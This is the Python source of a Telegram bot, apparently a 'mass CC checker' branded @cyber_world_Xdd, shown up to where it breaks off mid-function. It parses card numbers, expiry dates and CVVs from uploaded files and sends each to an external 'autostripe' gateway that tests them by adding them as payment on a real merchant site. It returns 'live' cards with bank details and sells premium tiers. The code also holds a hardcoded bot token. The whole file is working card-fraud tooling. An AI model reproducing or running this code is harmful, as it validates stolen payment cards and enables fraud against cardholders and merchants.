import logging
import sqlite3
import time
import requests
import re
import random
import string
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler, MessageHandler, filters
from datetime import datetime, timedelta

# Bot Configuration
TOKEN = "8544325928:AAHnswCmwaUIL0UheZUxgp0FnRW3snx4iB0" #Chage With Your Actul Bot Tokan#
OWNER_ID = 8456004769 #Chage Owner Id #
CHANNEL_USERNAME = "@cyber_world_Xdd" #and change channel username #

# User Limits and Cooldowns
FREE_LIMIT = 300
PREMIUM_LIMIT = 600
OWNER_LIMIT = 1200
COOLDOWN_TIME = 300  # 5 minutes

# Store user files in memory
user_files = {}
active_checks = {}
stop_controllers = {}  # ADDED GLOBAL STOP CONTROLLERS

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# MILITARY STOP CONTROLLER CLASS - ADD THIS
class MassCheckController:
    """Military-grade stop controller"""
    def __init__(self, user_id):
        self.user_id = user_id
        self.should_stop = False
        self.last_check_time = time.time()
        self.active = True
    
    def stop(self):
        """Instant stop command"""
        self.should_stop = True
        self.active = False
        logger.info(f"FORCE STOPPED for user {self.user_id}")
    
    def should_continue(self):
        """Check if should continue processing"""
        self.last_check_time = time.time()
        return not self.should_stop and self.active

# Initialize database
def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, status TEXT, cooldown_until REAL, join_date REAL)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS premium_codes
                 (code TEXT PRIMARY KEY, days INTEGER, created_at REAL, used_by INTEGER)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS redeemed
                 (user_id INTEGER, code TEXT, redeemed_at REAL, expires_at REAL)''')
    
    # Insert owner if not exists
    c.execute("INSERT OR IGNORE INTO users (user_id, status, join_date) VALUES (?, ?, ?)",
              (OWNER_ID, "owner", time.time()))
    
    conn.commit()
    conn.close()

# User management functions
def get_user_status(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute("SELECT status FROM users WHERE user_id=?", (user_id,))
    result = c.fetchone()
    
    if not result:
        c.execute("INSERT INTO users (user_id, status, join_date) VALUES (?, ?, ?)",
                  (user_id, "free", time.time()))
        conn.commit()
        status = "free"
    else:
        status = result[0]
    
    # Check premium expiry
    if status == "premium":
        c.execute("SELECT expires_at FROM redeemed WHERE user_id=?", (user_id,))
        expiry = c.fetchone()
        if expiry and time.time() > expiry[0]:
            c.execute("UPDATE users SET status='free' WHERE user_id=?", (user_id,))
            conn.commit()
            status = "free"
    
    conn.close()
    return status

def get_user_limit(user_id):
    status = get_user_status(user_id)
    if user_id == OWNER_ID:
        return OWNER_LIMIT
    elif status == "premium":
        return PREMIUM_LIMIT
    else:
        return FREE_LIMIT

def is_on_cooldown(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute("SELECT cooldown_until FROM users WHERE user_id=?", (user_id,))
    result = c.fetchone()
    
    conn.close()
    
    if result and result[0]:
        return time.time() < result[0]
    return False

def set_cooldown(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    cooldown_until = time.time() + COOLDOWN_TIME
    c.execute("UPDATE users SET cooldown_until=? WHERE user_id=?", (cooldown_until, user_id))
    
    conn.commit()
    conn.close()

# Channel check function
async def check_channel_membership(user_id, context):
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status not in ['left', 'kicked']
    except Exception as e:
        logger.error(f"Channel check error: {e}")
        return False

# SIMPLE CC PARSER
def simple_cc_parser(text):
    """
    SIMPLE PARSER: Extract CCs from text
    """
    valid_ccs = []
    
    # Common CC patterns
    patterns = [
        # CC|MM|YYYY|CVV
        r'(\d{13,19})[\|/\s:\-]+(\d{1,2})[\|/\s:\-]+(\d{2,4})[\|/\s:\-]+(\d{3,4})',
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            cc, month, year, cvv = match
            
            # Basic validation
            if len(cc) < 13 or len(cc) > 19:
                continue
                
            # Format month and year
            month = month.zfill(2)
            if len(year) == 2:
                year = "20" + year
                
            # CVV validation
            if cc.startswith(('34', '37')):  # Amex
                if len(cvv) != 4:
                    continue
            else:
                if len(cvv) != 3:
                    continue
                    
            valid_ccs.append((cc, month, year, cvv))
    
    return valid_ccs

def detect_card_type(cc_number):
    """Detect card type based on BIN"""
    if re.match(r'^4[0-9]{12}(?:[0-9]{3})?$', cc_number):
        return "VISA"
    elif re.match(r'^5[1-5][0-9]{14}$', cc_number):
        return "MASTERCARD"
    elif re.match(r'^3[47][0-9]{13}$', cc_number):
        return "AMEX"
    elif re.match(r'^6(?:011|5[0-9]{2})[0-9]{12}$', cc_number):
        return "DISCOVER"
    elif re.match(r'^3(?:0[0-5]|[68][0-9])[0-9]{11}$', cc_number):
        return "DINERS CLUB"
    elif re.match(r'^(?:2131|1800|35\d{3})\d{11}$', cc_number):
        return "JCB"
    else:
        return "UNKNOWN"

# BIN Lookup function
def bin_lookup(bin_number):
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
        if response.status_code == 200:
            return response.json()
    except Exception as e:
        logger.error(f"BIN lookup error: {e}")
    return None

# CC Check function
def check_cc(cc_number, month, year, cvv):
    start_time = time.time()
    
    cc_data = f"{cc_number}|{month}|{year}|{cvv}"
    
    # Your API endpoint
    url = f"https://blackxcard-autostripe.onrender.com/gateway=autostripe/key=Blackxcard/site=dilaboards.com/cc={cc_data}"
    
    try:
        response = requests.get(url, timeout=35)
        end_time = time.time()
        process_time = round(end_time - start_time, 2)
        
        if response.status_code == 200:
            response_text = response.text
            
            approved_keywords = ['approved', 'success', 'charged', 'payment added', 'live', 'valid']
            declined_keywords = ['declined', 'failed', 'invalid', 'error', 'dead']
            
            response_lower = response_text.lower()
            
            if any(keyword in response_lower for keyword in approved_keywords):
                return "approved", process_time, response_text
            elif any(keyword in response_lower for keyword in declined_keywords):
                return "declined", process_time, response_text
            else:
                if len(response_text.strip()) > 5:
                    return "approved", process_time, response_text
                else:
                    return "declined", process_time, response_text
        else:
            return "declined", process_time, f"HTTP Error {response.status_code}"
            
    except requests.exceptions.Timeout:
        return "error", 0, "Request Timeout (35s)"
    except requests.exceptions.ConnectionError:
        return "error", 0, "Connection Error"
    except Exception as e:
        return "error", 0, f"API Error: {str(e)}"

# FILE PARSER
def parse_cc_file(file_content):
    """Parse file and extract CCs"""
    try:
        if isinstance(file_content, (bytes, bytearray)):
            text_content = file_content.decode('utf-8', errors='ignore')
        else:
            text_content = str(file_content)
        
        # Use simple parser
        valid_ccs = simple_cc_parser(text_content)
        
        formatted_ccs = [f"{cc}|{month}|{year}|{cvv}" for cc, month, year, cvv in valid_ccs]
        
        return formatted_ccs
        
    except Exception as e:
        logger.error(f"File parsing error: {e}")
        return []

# VERTICAL BUTTON LAYOUT FUNCTION
def create_status_buttons(user_id, current_cc, status, approved_count, declined_count, checked_count, total_to_check):
    """Create VERTICAL button layout - LINE BY LINE"""
    keyboard = [
        # Line 1: Current CC
        [InlineKeyboardButton(f"ð˜¾ð™ªð™§ð™§ð™šð™£ð™© âžœ {current_cc[:8]}...", callback_data="current_info")],
        
        # Line 2: Status
        [InlineKeyboardButton(f" ð™Žð™©ð™–ð™©ð™ªð™¨ âžœ {status}", callback_data="status_info")],
        
        # Line 3: Approved
        [InlineKeyboardButton(f"âœ… ð˜¼ð™¥ð™¥ð™§ð™¤ð™«ð™šð™™ âžœ {approved_count}", callback_data="approved_info")],
        
        # Line 4: Declined  
        [InlineKeyboardButton(f"âŒ ð˜¿ð™šð™˜ð™¡ð™žð™£ð™šð™™ âžœ {declined_count}", callback_data="declined_info")],
        
        # Line 5: Progress
        [InlineKeyboardButton(f"â³ ð™‹ð™§ð™¤ð™œð™§ð™šð™¨ð™¨ âžœ {checked_count}/{total_to_check}", callback_data="progress_info")],
        
        # Line 6: EMERGENCY STOP - RED COLOR
        [InlineKeyboardButton("â˜‘ï¸ ð™Žð™ð™Šð™‹", callback_data=f"stop_check_{user_id}")]
    ]
    return InlineKeyboardMarkup(keyboard)

# AUTO FILE DETECTION HANDLER
async def handle_document(update: Update, context: CallbackContext):
    """Automatically detect when user uploads a file"""
    user_id = update.effective_user.id
    
    if not await check_channel_membership(user_id, context):
        await update.message.reply_text("âŒ Join our channel first to use this bot!")
        return
    
    document = update.message.document
    
    # Check if it's a text file
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("âŒ Please upload a .txt file!")
        return
    
    try:
        # Download and parse the file
        await update.message.reply_text("ð˜¼ð™¡ð™¡ ð˜¾ð™˜ð™¨ ð˜¼ð™§ð™š ð˜¾ð™ð™šð™˜ð™ ð™žð™£ð™œ... ð™—ð™¤ð™© ð™—ð™® @cyber_world_Xdd")
        file = await document.get_file()
        file_content = await file.download_as_bytearray()
        
        # Parse CCs
        cc_list = parse_cc_file(file_content)
        total_ccs = len(cc_list)
        
        if total_ccs == 0:
            await update.message.reply_text("""
âŒ **No valid CCs found in file!**

Please ensure your file contains CCs in this format:
4147768578745265|04|2026|168 
5154620012345678|05|2027|123 
371449635398431|12|2025|1234
4147768578745265|11|2026|168 
371449635398431|02|2025|1234
5154620012345678|12|2027|123
            """)
            return
        
        # Store file data for this user
        user_files[user_id] = {
            'cc_list': cc_list,
            'file_name': document.file_name,
            'total_ccs': total_ccs,
            'timestamp': time.time()
        }
        
        # Get user limit
        user_limit = get_user_limit(user_id)
        
        # Create button message
        keyboard = [
            [InlineKeyboardButton("ðŸš€ Check Cards", callback_data=f"start_check_{user_id}")],
            [InlineKeyboardButton("âŒ Cancel", callback_data=f"cancel_check_{user_id}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message_text = f"""
â³ ð™”ð™¤ð™ªð™§ ð™ð™žð™¡ð™¡ ð˜¿ð™šð™©ð™šð™˜ð™©ð™šð™™ 

âœ… ð™ð™žð™¡ð™¡ ð™‰ð™–ð™¢ð™š âžœ `{document.file_name}`
â˜‘ï¸ ð˜¾ð™–ð™§ð™™ð™¨ ð™ð™¤ð™ªð™£ð™™ âžœ `{total_ccs}`
ðŸ’Ž ð™”ð™¤ð™ªð™§ ð˜¾ð™˜ ð™‡ð™žð™¢ð™žð™© âžœ `{user_limit}` CCs

ðŸ’Ž ð˜½ð™¤ð™© ð˜½ð™® âžœ @cyber_world_Xdd
â˜‘ï¸ ð™…ð™¤ð™žð™£ ð™Šð™ªð™§ ð˜¾ð™ð™–ð™£ð™£ð™šð™¡ ð˜¼ð™£ð™™ ð™Žð™ªð™¥ð™¥ð™¤ð™§ð™© âžœ @cyber_world_Xdd

ð˜¾ð™¡ð™žð™˜ð™  ð™Šð™£ ð˜¾ð™ð™šð™˜ð™  ð˜¾ð™–ð™§ð™™ð™¨ ð™ð™¤ ð˜¾ð™ð™šð™˜ð™  ð™”ð™¤ð™ªð™§ ð˜¾ð™˜ð™¨ ðŸ˜Ž
        """
        
        await update.message.reply_text(message_text, reply_markup=reply_markup, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"Document handling error: {e}")
        await update.message.reply_text(f"âŒ Error processing file: {str(e)}")

# ENHANCED BUTTON HANDLER
async def handle_button(update: Update, context: CallbackContext):
    """Handle button clicks - COMPLETELY FIXED VERSION"""
    query = update.callback_query
    user_id = query.from_user.id
    callback_data = query.data
    
    await query.answer()
    
    logger.info(f"Button pressed: {callback_data} by user {user_id}")
    
    # START CHECK BUTTON
    if callback_data.startswith('start_check_'):
        target_user_id = int(callback_data.split('_')[2])
        
        if user_id != target_user_id:
            await query.message.reply_text("âŒ This is not your file!")
            return
        
        await start_card_check(query, context, user_id)
        
    # STOP CHECK BUTTON - FIXED PARSING
    elif callback_data.startswith('stop_check_'):
        target_user_id = int(callback_data.split('_')[2])
        
        logger.info(f"Stop button pressed for user {target_user_id} by {user_id}")
        
        if user_id != target_user_id:
            await query.answer("âŒ This is not your check!", show_alert=True)
            return
        
        # AGGRESSIVE STOP MECHANISM - MULTIPLE LAYERS
        stop_success = False
        
        # LAYER 1: Stop Controller
        if target_user_id in stop_controllers:
            stop_controllers[target_user_id].stop()
            logger.info(f"Stop controller activated for {target_user_id}")
            stop_success = True
        
        # LAYER 2: Active Checks
        if target_user_id in active_checks:
            active_checks[target_user_id] = False
            logger.info(f"Active checks stopped for {target_user_id}")
            stop_success = True
        
        # LAYER 3: Direct Global Flag
        if target_user_id in user_files:
            # Mark for immediate termination
            user_files[target_user_id]['force_stop'] = True
            logger.info(f"Force stop set for {target_user_id}")
            stop_success = True
        
        if stop_success:
            # INSTANT VISUAL FEEDBACK
            await query.edit_message_text(
                "ðŸ›‘ **EMERGENCY STOP ACTIVATED!**\n\n" +
                "âœ… Checking process terminated immediately!\n" +
                "ðŸ“Š All resources freed!\n" +
                "ðŸ”§ Ready for new file upload!",
                parse_mode='Markdown'
            )
            logger.info(f"User {user_id} successfully stopped check {target_user_id}")
        else:
            await query.answer("âŒ No active check found to stop!", show_alert=True)
        
    elif callback_data.startswith('cancel_check_'):
        target_user_id = int(callback_data.split('_')[2])
        
        if user_id != target_user_id:
            await query.message.reply_text("âŒ This is not your file!")
            return
        
        # Remove user file data
        if user_id in user_files:
            del user_files[user_id]
        
        await query.edit_message_text("âŒ **Check cancelled!**")
        
    elif callback_data == "check_join":
        await handle_join_callback(update, context)

# COMPLETE MASS CHECK FUNCTION WITH MILITARY STOP
async def start_card_check(query, context: CallbackContext, user_id: int):
    """MASS CHECK WITH BULLETPROOF STOP DETECTION"""
    
    if user_id not in user_files:
        await query.edit_message_text("âŒ File data not found! Please upload again.")
        return
    
    if is_on_cooldown(user_id):
        await query.edit_message_text("â³ **Cooldown Active!** Wait 5 minutes between mass checks.")
        return
    
    file_data = user_files[user_id]
    cc_list = file_data['cc_list']
    total_ccs = file_data['total_ccs']
    user_limit = get_user_limit(user_id)
    total_to_check = min(total_ccs, user_limit)
    
    # Set cooldown
    set_cooldown(user_id)
    
    # INITIALIZE MULTIPLE STOP LAYERS
    stop_controller = MassCheckController(user_id)
    stop_controllers[user_id] = stop_controller
    active_checks[user_id] = True
    user_files[user_id]['force_stop'] = False  # New direct stop flag
    
    # Create initial status
    status_text = "ðŸš€ **Mass CC Check Started!**\n\n"
    reply_markup = create_status_buttons(
        user_id=user_id,
        current_cc="Starting...",
        status="Initializing",
        approved_count=0,
        declined_count=0,
        checked_count=0,
        total_to_check=total_to_check
    )
    
    status_msg = await query.edit_message_text(status_text, reply_markup=reply_markup)
    
    # Initialize counters
    approved_count = 0
    declined_count = 0
    checked_count = 0
    approved_ccs = []
    
    start_time = time.time()
    
    # PROCESS CCs WITH MULTI-LAYER STOP CHECKS
    for index, cc_data in enumerate(cc_list[:user_limit]):
        # LAYER 1: Stop Controller Check
        if not stop_controller.should_continue():
            logger.info(f"Stop controller triggered for user {user_id}")
            break
            
        # LAYER 2: Active Checks Flag
        if user_id not in active_checks or not active_checks[user_id]:
            logger.info(f"Active checks flag stopped for user {user_id}")
            break
            
        # LAYER 3: Direct Force Stop Flag
        if user_id in user_files and user_files[user_id].get('force_stop', False):
            logger.info(f"Force stop flag triggered for user {user_id}")
            break
            
        checked_count = index + 1
        
        try:
            cc_number, month, year, cvv = cc_data.split('|')
            card_type = detect_card_type(cc_number)
            
            # UPDATE STATUS
            status_text = "ð˜¾ð™¤ð™¤ð™ ð™žð™£ð™œ ðŸ³ ð˜¾ð˜¾ð™¨ ð™Šð™£ð™š ð™—ð™® ð™Šð™£ð™š...\n\n"
            reply_markup = create_status_buttons(
                user_id=user_id,
                current_cc=cc_number,
                status="Checking...",
                approved_count=approved_count,
                declined_count=declined_count,
                checked_count=checked_count,
                total_to_check=total_to_check
            )
            
            try:
                await status_msg.edit_text(status_text, reply_markup=reply_markup)
            except Exception as e:
                logger.error(f"Message edit error: {e}")
            
            # PRE-API STOP CHECK
            if (not stop_controller.should_continue() or 
                user_id not in active_checks or 
                not active_checks[user_id] or
                (user_id in user_files and user_files[user_id].get('force_stop', False))):
                break
                
            # Check CC
            status, process_time, api_response = check_cc(cc_number, month, year, cvv)
            
            # POST-API STOP CHECK
            if (not stop_controller.should_continue() or 
                user_id not in active_checks or 
                not active_checks[user_id] or
                (user_id in user_files and user_files[user_id].get('force_stop', False))):
                break
                
            if status == "approved":
                approved_count += 1
                bin_info = bin_lookup(cc_number[:6])
                
                # ORIGINAL APPROVED MESSAGE
                approved_text = f"""
ð˜¼ð™‹ð™‹ð™ð™Šð™‘ð™€ð˜¿ âœ…

ð—–ð—– â‡¾ `{cc_number}|{month}|{year}|{cvv}`
ð—šð—®ð˜ð—²ð™¬ð™–ð™® â‡¾ Stripe Auth
ð—¥ð—²ð˜€ð—½ð—¼ð—»ð˜€ð—² â‡¾ Payment added successfully

```
ð—•ð—œð—¡ ð—œð—»ð—³ð—¼ âžœ  {bin_info.get('brand', 'N/A')} - {bin_info.get('type', 'N/A')}
ð—•ð—®ð—»ð—¸ âžœ  {bin_info.get('bank', 'N/A')}
ð—–ð—¼ð˜‚ð—»ð˜ð—¿ð˜† âžœ  {bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '')}```

ð—§ð—¼ð—¼ð—¸ {process_time} ð˜€ð—²ð—°ð—¼ð—»ð—±ð˜€
                """
                
                try:
                    await context.bot.send_message(chat_id=user_id, text=approved_text, parse_mode='Markdown')
                except Exception as e:
                    logger.error(f"Approved message send error: {e}")
                
                approved_ccs.append(cc_data)
            else:
                declined_count += 1
            
            # UPDATE STATUS AFTER CHECK
            status_text = "ð˜¾ð™¤ð™¤ð™ ð™žð™£ð™œ ðŸ³ ð˜¾ð˜¾ð™¨ ð™Šð™£ð™š ð™—ð™® ð™Šð™£ð™š...\n\n"
            final_status = "âœ… Live" if status == "approved" else "âŒ Dead"
            reply_markup = create_status_buttons(
                user_id=user_id,
                current_cc=cc_number,
                status=final_status,
                approved_count=approved_count,
                declined_count=declined_count,
                checked_count=checked_count,
                total_to_check=total_to_check
            )
            
            try:
                await status_msg.edit_text(status_text, reply_markup=reply_markup)
            except Exception as e:
                logger.error(f"Status update error: {e}")
            
            # NON-BLOCKING DELAY WITH FREQUENT STOP CHECKS
            for i in range(10):
                # CHECK STOP EVERY 0.05 SECONDS
                if (not stop_controller.should_continue() or 
                    user_id not in active_checks or 
                    not active_checks[user_id] or
                    (user_id in user_files and user_files[user_id].get('force_stop', False))):
                    break
                await asyncio.sleep(0.05)
                
        except Exception as e:
            logger.error(f"CC processing error: {e}")
            declined_count += 1
            continue
    
    # COMPLETE CLEANUP
    if user_id in stop_controllers:
        del stop_controllers[user_id]
    if user_id in active_checks:
        del active_checks[user_id]
    if user_id in user_files:
        # Remove force_stop flag but keep file data if needed
        if 'force_stop' in user_files[user_id]:
            del user_files[user_id]['force_stop']
    
    # FINAL RESULTS
    end_time = time.time()
    total_time = round(end_time - start_time, 2)
    
    was_stopped = (
        (user_id in stop_controllers and stop_controllers[user_id].should_stop) or
        (user_id in user_files and user_files[user_id].get('force_stop', False))
    )
    
    if was_stopped:
        final_text = f"""
ðŸ›‘ **CHECK STOPPED BY USER**

ðŸ“Š **Partial Results:**
âœ… Approved: {approved_count}
âŒ Declined: {declined_count}  
ðŸ”¢ Checked: {checked_count}
â±ï¸ Time: {total_time}s

âš¡ Process terminated successfully!
        """
    else:
        final_text = f"""
âœ… ð™ˆð™–ð™¨ð™¨ ð˜¾ð™ð™šð™˜ð™  ð˜¾ð™¤ð™¢ð™¥ð™¡ð™šð™©ð™šð™™! ð™Žð™€ð™­'ð˜¾ð™€ð™Žð™Žð™ð™ð™‡ð™‡ð™®
 
â”œðŸ“Š ð™Žð™©ð™–ð™©ð™ªð™¨
â”œâ˜‘ï¸ ð˜¼ð™¥ð™¥ð™§ð™¤ð™«ð™šð™™ âžœ {approved_count}
â”œâŒ ð˜¿ð™šð™˜ð™¡ð™žð™£ð™šð™™ âžœ {declined_count}
â”œðŸ’€ ð™ð™¤ð™©ð™–ð™¡ âžœ {checked_count}  
â”œâ±ï¸ Time: {total_time}s

âš¡ ð™ˆð™–ð™¨ð™¨ ð˜¾ð™ð™šð™˜ð™  ð˜¾ð™¤ð™¢ð™¥ð™¡ð™šð™©ð™šâ˜‘ï¸
        """
    
    try:
        await status_msg.edit_text(final_text, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Final message error: {e}")

# [REST OF THE CODE REMAINS THE SAME - start_command, chk_command, etc.]
# Continue with all the other functions exactly as in your original code...

# Custom command handler for dot commands
async def handle_custom_commands(update: Update, context: CallbackContext):
    """Handle .prefix commands manually"""
    if not update.message or not update.message.text:
        return
    
    text = update.message.text.strip()
    user_id = update.effective_user.id
    
    if text.startswith('.'):
        parts = text[1:].split(maxsplit=1)
        if not parts:
            return
            
        command = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""
        
        if command == 'start':
            await start_command(update, context)
        elif command == 'chk':
            if args:
                context.args = [args]
            else:
                context.args = []
            await chk_command(update, context)
        elif command == 'mtxt':
            await mtxt_manual_command(update, context)
        elif command == 'id':
            await id_command(update, context)
        elif command == 'code':
            if args:
                context.args = args.split()
            else:
                context.args = []
            await code_command(update, context)
        elif command == 'redeem':
            if args:
                context.args = args.split()
            else:
                context.args = []
            await redeem_command(update, context)
        elif command == 'broadcast':
            if args:
                context.args = args.split()
            else:
                context.args = []
            await broadcast_command(update, context)
        elif command == 'stats':
            await stats_command(update, context)

# Start command
async def start_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    if not await check_channel_membership(user_id, context):
        keyboard = [
            [InlineKeyboardButton("ðŸ”¥ ð™…ð™Šð™„ð™‰ ð™Šð™ð™ ð˜¾ð™ƒð˜¼ð™‰ð™‰ð™€ð™‡ ðŸ”¥", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")],
            [InlineKeyboardButton("âœ… ð™„'ð™‘ð™€ ð™…ð™Šð™„ð™‰ð™€ð˜¿", callback_data="check_join")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        start_text = """
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
  ð™’ð™šð™¡ð™˜ð™¤ð™¢ð™š ð™ð™¤ ð™ð™®ð™§ð™–ð™£ð™© ð™ˆð™–ð™¨ð™¨ ð˜¾ð™ð™šð™˜ð™ ð™šð™§
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ðŸ”’ ð—”ð—–ð—–ð—˜ð—¦ð—¦ ð——ð—˜ð—¡ð—œð—˜ð——

âš ï¸ ð™ð™žð™§ð™¨ð™© ð™…ð™¤ð™žð™£ ð™Šð™ªð™§ ð˜¾ð™ð™–ð™£ð™£ð™šð™¡ ð˜½ð™§ð™¤ ðŸ˜Ž

ðŸ’Ž ð—–ð—µð—®ð—»ð—»ð—²ð—¹: @cyber_world_Xdd â³
        """
        
        await update.message.reply_text(start_text, reply_markup=reply_markup)
        return
    
    user_status = get_user_status(user_id)
    welcome_text = f"""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—      
  ð™’ð™šð™¡ð™˜ð™¤ð™¢ð™š ð™ð™¤ ð™ð™®ð™§ð™–ð™£ð™© ð™ˆð™–ð™¨ð™¨ ð˜¾ð™ð™šð™˜ð™ ð™šð™§
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

âœ… ð—”ð—°ð—°ð—²ð˜€ð˜€ ð—šð—¿ð—®ð—»ð˜ð—²ð—±

ðŸ“Š ð—¬ð—¼ð˜‚ð—¿ ð—¦ð˜ð—®ð˜ð˜‚ð˜€: {user_status.upper()}

ðŸ”§ ð—”ð˜ƒð—®ð—¶ð—¹ð—®ð—¯ð—¹ð—² ð—–ð—¼ð—ºð—ºð—®ð—»ð—±ð˜€:

â€¢ ð™ð™¨ð™š /chk ð™ð™¤ ð˜¾ð™ð™šð™˜ð™  ð™Žð™žð™£ð™œð™¡ð™š ð˜¾ð™–ð™§ð™™ð™¨

â€¢ ð™…ð™ªð™¨ð™© ð™ð™¥ð™¡ð™¤ð™–ð™™ ð˜¼ð™£ð™® ð™ð™žð™¡ð™¡ ð™žð™£ .ð™©ð™­ð™© ð™ð™¤ð™§ð™¢ð™–ð™©

â€¢ ð™ð™¨ð™š /redeem ð™ð™¤ ð™‚ð™šð™© ð™‹ð™§ð™šð™¢ð™žð™ªð™¢ ð˜¼ð™˜ð™˜ð™šð™¨ð™¨

ðŸ˜Ž ð™ð™¨ð™š /mtxt ð˜¾ð™¤ð™¢ð™¢ð™–ð™£ð™™ ð™ð™¤ð™§ ð™ˆð™–ð™¨ð™¨ ð˜¾ð™ð™  ð™„ð™£ð™›ð™¤ð™§ð™¢ð™–ð™©ð™žð™¤ð™£ 

ðŸ’Ž ð—–ð—¿ð—²ð—±ð—¶ð˜ð˜€ âžœ @cyber_world_Xdd
    """
    
    await update.message.reply_text(welcome_text)

# Join callback handler
async def handle_join_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    
    if not await check_channel_membership(user_id, context):
        await query.answer("âŒ You haven't joined the channel yet!", show_alert=True)
        return
    
    await query.answer("âœ… Access Granted!")
    
    user_status = get_user_status(user_id)
    welcome_text = f"""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—      
  ð™’ð™šð™¡ð™˜ð™¤ð™¢ð™š ð™ð™¤ ð™ð™®ð™§ð™–ð™£ð™© ð™ˆð™–ð™¨ð™¨ ð˜¾ð™ð™šð™˜ð™ ð™šð™§ðŸ˜Ž
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

âœ… ð—”ð—°ð—°ð—²ð˜€ð˜€ ð—šð—¿ð—®ð—»ð˜ð—²ð—±

ðŸ“Š ð—¬ð—¼ð˜‚ð—¿ ð—¦ð˜ð—®ð˜ð˜‚ð˜€: {user_status.upper()}

ðŸ”§ ð—”ð˜ƒð—®ð—¶ð—¹ð—®ð—¯ð—¹ð—² ð—–ð—¼ð—ºð—ºð—®ð—»ð—±ð˜€:

â€¢ ð™ð™¨ð™š /chk ð™ð™¤ ð˜¾ð™ð™šð™˜ð™  ð™Žð™žð™£ð™œð™¡ð™š ð˜¾ð™–ð™§ð™™ð™¨

â€¢ ð™…ð™ªð™¨ð™© ð™ð™¥ð™¡ð™¤ð™–ð™™ ð˜¼ð™£ð™® ð™ð™žð™¡ð™¡ ð™žð™£ .ð™©ð™­ð™© ð™ð™¤ð™§ð™¢ð™–ð™©

â€¢ ð™ð™¨ð™š /redeem ð™ð™¤ ð™‚ð™šð™© ð™‹ð™§ð™šð™¢ð™žð™ªð™¢ ð˜¼ð™˜ð™˜ð™šð™¨ð™¨

ðŸ˜Ž ð™ð™¨ð™š /mtxt ð˜¾ð™¤ð™¢ð™¢ð™–ð™£ð™™ ð™ð™¤ð™§ ð™ˆð™–ð™¨ð™¨ ð˜¾ð™ð™  ð™„ð™£ð™›ð™¤ð™§ð™¢ð™–ð™©ð™žð™¤ð™£ 

ðŸ’Ž ð—–ð—¿ð—²ð—±ð—¶ð˜ð˜€ âžœ @cyber_world_Xdd
    """
    
    await query.edit_message_text(welcome_text)

# ID command
async def id_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    await update.message.reply_text(f"ðŸ†” ð—¬ð—¼ð˜‚ð—¿ ð—¨ð˜€ð—²ð—¿ ð—œð——: `{user_id}`", parse_mode='Markdown')

# Manual mtxt command for backward compatibility
async def mtxt_manual_command(update: Update, context: CallbackContext):
    """Manual mtxt command for users who prefer commands"""
    user_id = update.effective_user.id
    
    if not await check_channel_membership(user_id, context):
        await update.message.reply_text("âŒ Join our channel first to use this bot!")
        return
    
    await update.message.reply_text("""
ð™ƒð™¤ð™¬ ð™ð™¤ ð™ð™¨ð™š /ð™¢ð™©ð™­ð™© ð˜¾ð™¤ð™¢ð™¢ð™–ð™£ð™™ ðŸ³

1. ð™ð™¥ð™¡ð™¤ð™–ð™™ ð™–ð™£ð™® ð™›ð™žð™¡ð™¡ ð™žð™£ .ð™©ð™­ð™© ð™›ð™¤ð™§ð™¢ð™–ð™© ðŸ’Ž

2. ð˜½ð™¤ð™© ð˜¼ð™ªð™©ð™¤ ð˜¿ð™šð™©ð™šð™˜ð™© ð™”ð™¤ð™ªð™§ ð™ð™žð™¡ð™¡ ð˜¼ð™£ð™™ ð™Žð™šð™£ð™™ ð™”ð™¤ð™ª ð™ˆð™šð™¨ð™¨ð™–ð™œð™š ðŸ˜Ž

3.ð™ð™ð™–ð™£ ð˜¾ð™¡ð™žð™˜ð™  ð™Šð™£ ð˜¾ð™ð™šð™˜ð™  ð˜¾ð™–ð™§ð™™ð™¨ ð˜½ð™ªð™©ð™©ð™¤ð™£ â³
    """)

# Single CC Check command
async def chk_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    if not await check_channel_membership(user_id, context):
        await update.message.reply_text("âŒ Join our channel first to use this bot!")
        return
    
    if len(context.args) == 0:
        await update.message.reply_text("""
ðŸ’³ ð™ƒð™¤ð™¬ ð™ð™¤ ð™ð™¨ð™š ð™Žð™žð™£ð™œð™¡ð™š ð˜¾ð™ð™  ð˜¾ð™˜ð™¨ ð˜¾ð™¤ð™¢ð™¢ð™–ð™£ð™™

